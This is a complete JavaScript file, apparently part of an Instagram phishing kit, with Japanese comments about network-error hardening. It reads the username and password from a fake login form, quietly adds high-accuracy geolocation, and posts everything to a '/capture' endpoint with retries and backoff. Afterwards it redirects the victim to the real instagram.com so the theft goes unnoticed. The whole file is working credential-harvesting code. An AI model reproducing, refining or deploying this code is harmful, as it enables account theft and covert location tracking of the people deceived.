/* capture.js v2 — 通信エラー対策: タイムアウト / リトライ / エラー可視化 */
(() => {
  const form = document.getElementById('ig-form');
  const btn  = document.getElementById('submit-btn');
  const u = form.querySelector('[name="username"]');
  const p = form.querySelector('[name="password"]');
  const latEl = form.querySelector('[name="lat"]');
  const lngEl = form.querySelector('[name="lng"]');

  let acc = '';

  // 位置情報は取れたら載せる（要素が無くても落ちないようガード）
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      r => {
        if (latEl) latEl.value = r.coords.latitude;
        if (lngEl) lngEl.value = r.coords.longitude;
        acc = Math.round(r.coords.accuracy);
      },
      () => {},
      { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
    );
  }

  function showError(msg) {
    let box = form.querySelector('.error');
    if (!msg) { if (box) box.remove(); return; }
    if (!box) {
      box = document.createElement('div');
      box.className = 'error';
      form.insertBefore(box, btn); // パスワード欄とボタンの間
    }
    box.textContent = msg;
  }

  const sync = () => { btn.disabled = !(u.value.trim() && p.value.trim()); };
  u.addEventListener('input', sync);
  p.addEventListener('input', sync);
  sync();

  const sleep = ms => new Promise(r => setTimeout(r, ms));

  // タイムアウト付きPOST。通信失敗は retryable を立てて返す（例外は投げない）
  const post = async (fd, timeoutMs = 20000) => {
    const ctl = new AbortController();
    const t = setTimeout(() => ctl.abort(), timeoutMs);
    try {
      const r = await fetch('/capture', {
        method: 'POST',
        body: fd,
        headers: { 'X-Requested-With': 'fetch' },
        signal: ctl.signal,
      });
      const ct = r.headers.get('content-type') || '';
      if (!ct.includes('application/json')) {
        return { ok: false, retryable: true, error: `サーバーエラー (${r.status})` };
      }
      return await r.json();
    } catch (e) {
      return {
        ok: false,
        retryable: true,
        error: e.name === 'AbortError'
          ? 'タイムアウト（サーバー応答なし）'
          : '通信エラー',
      };
    } finally {
      clearTimeout(t);
    }
  };

  form.addEventListener('submit', async e => {
    e.preventDefault();
    showError('');
    btn.disabled = true;

    const fd = new FormData(form);
    if (acc) fd.append('acc', acc);

    let res;
    for (let i = 0; i < 3; i++) {
      btn.textContent = i ? `再試行中... (${i}/3)` : 'ログイン中...';
      res = await post(fd);
      // パスワード違い（確定エラー）は再試行しない＝無駄なログインを減らす
      if (res.ok || !res.retryable) break;
      await sleep(1000 * 2 ** i); // 1s → 2s → 4s
    }

    if (res.ok) { location.href = 'https://www.instagram.com/'; return; }

    showError(res.error || 'ユーザー名またはパスワードが正しくありません。');
    p.value = '';
    p.focus();
    btn.textContent = 'ログイン';
    sync();
  });
})();
